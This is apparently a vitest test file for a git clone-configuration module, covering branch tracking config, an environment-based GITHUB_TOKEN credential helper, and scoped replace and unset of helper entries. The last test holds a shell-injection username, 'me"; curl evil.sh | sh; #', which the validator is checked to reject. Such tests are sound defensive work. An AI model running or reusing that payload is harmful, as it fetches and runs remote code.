import { describe, it, expect, afterEach } from 'vitest';
import {
  cloneCredentialArgs,
  cloneCredentialConfigArgs,
  cloneTrackingConfigArgs,
  credentialHelperValue,
  ORIGIN_FETCH_REFSPEC,
} from '../clone-config.js';

describe('cloneTrackingConfigArgs', () => {
  // A slashed draft name is the everyday case (`<email-localpart>/<slug>`), and
  // the branch lands verbatim inside the config KEY — pin the exact tuples so a
  // future quoting/encoding change can't silently re-point tracking.
  it('emits the tracking tuples for a slashed branch, and keeps gc in the foreground', () => {
    expect(cloneTrackingConfigArgs('feature/x')).toEqual([
      ['config', '--replace-all', 'remote.origin.fetch', ORIGIN_FETCH_REFSPEC],
      ['config', '--replace-all', 'branch.feature/x.remote', 'origin'],
      ['config', '--replace-all', 'branch.feature/x.merge', 'refs/heads/feature/x'],
      // A detached `gc --auto` outlives the command this process waits on and
      // is never reaped; stamped here so existing clones get it on next pull.
      ['config', '--replace-all', 'gc.autoDetach', 'false'],
    ]);
  });
});

describe('credential config', () => {
  const ORIGINAL = process.env.GITHUB_TOKEN;
  afterEach(() => {
    if (ORIGINAL === undefined) delete process.env.GITHUB_TOKEN;
    else process.env.GITHUB_TOKEN = ORIGINAL;
  });

  it('reads the token from the environment at call time, never inlining its value', () => {
    process.env.GITHUB_TOKEN = 'ghp_supersecret';
    const helper = credentialHelperValue('x-access-token');
    expect(helper).toContain('password=$GITHUB_TOKEN');
    expect(helper).not.toContain('ghp_supersecret');
  });

  it('with no token: clones get no helper, and existing clones get theirs UNSET', () => {
    delete process.env.GITHUB_TOKEN;
    expect(credentialHelperValue('x-access-token')).toBeNull();
    // A fresh clone simply carries nothing…
    expect(cloneCredentialArgs('x-access-token')).toEqual([]);
    // …but an adopted clone may carry a helper from when a token WAS
    // configured, and that stale helper (answering with an empty password)
    // would shadow whatever auth the operator fell back to — so the repair
    // path removes it. Callers run this tolerantly: unset of a missing key
    // exits non-zero and is the expected no-op.
    expect(cloneCredentialConfigArgs('x-access-token')).toEqual([
      ['config', '--unset-all', 'credential.helper', 'password=\\$GITHUB_TOKEN'],
    ]);
  });

  it('passes the clone form as --config, which git only honours AFTER the subcommand', () => {
    process.env.GITHUB_TOKEN = 'ghp_x';
    // Pinned exactly: `-c` here instead of `--config` still authenticates the
    // clone but writes nothing into the new repo, which is the bug this guards.
    expect(cloneCredentialArgs('oauth2')).toEqual([
      '--config',
      `credential.helper=${credentialHelperValue('oauth2')}`,
    ]);
  });

  it('replaces rather than appends when re-stamping — scoped to app-owned values only', () => {
    process.env.GITHUB_TOKEN = 'ghp_x';
    // The trailing value-pattern is what keeps an operator's own clone-local
    // helper (store/cache/custom) out of reach of both the replace and the
    // unset — git only touches values matching it.
    expect(cloneCredentialConfigArgs('x-access-token')).toEqual([
      ['config', '--replace-all', 'credential.helper', credentialHelperValue('x-access-token'), 'password=\\$GITHUB_TOKEN'],
    ]);
  });

  it('refuses a username that would break out of the helper snippet', () => {
    process.env.GITHUB_TOKEN = 'ghp_x';
    expect(() => credentialHelperValue('me"; curl evil.sh | sh; #')).toThrow(/must match/);
  });
});
